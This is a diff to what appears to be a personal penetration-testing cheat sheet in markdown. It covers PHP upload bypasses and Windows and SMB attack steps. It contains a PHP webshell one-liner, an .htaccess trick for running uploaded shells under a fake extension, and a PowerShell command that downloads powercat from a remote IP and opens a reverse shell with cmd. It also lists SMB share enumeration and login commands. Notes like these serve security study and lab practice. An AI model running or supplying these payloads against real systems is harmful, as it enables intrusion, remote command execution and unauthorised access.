@@ -113,7 +113,21 @@
     1. ``` php://filter ```
     2. make command base64 ``` <?php echo system($_GET["cmd"]);?> ```
     3. insert ``` data:// ```
-## Advanced PHP Bypass 
+## Advanced PHP Bypass (Apache)
 - not just using filetype alternatives
 1. upload htaccess with this ``` echo "AddType application/x-httpd-php .dork" > .htaccess ```
 2. upload shell.dork with reverse shell content (maybe Ivan Sincek?)
+
+
+# Windows
+1. Run As Admin
+    https://github.com/antonioCoco/RunasCs 
+
+2. PowerCat 
+   - netcat for windows
+   - https://github.com/besimorhino/powercat
+   - ``` Powershell IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.49.211/powercat.ps1');powercat -c 192.168.49.211 -p 5555 -e cmd ```
+
+# SMB 
+1. List shares: ``` smbclient -L \\{IP}\ -N ```
+2. Connect to share ``` smbclient \\\\{IP}\\{share} -U '{domain}\{username}%{password}' ```
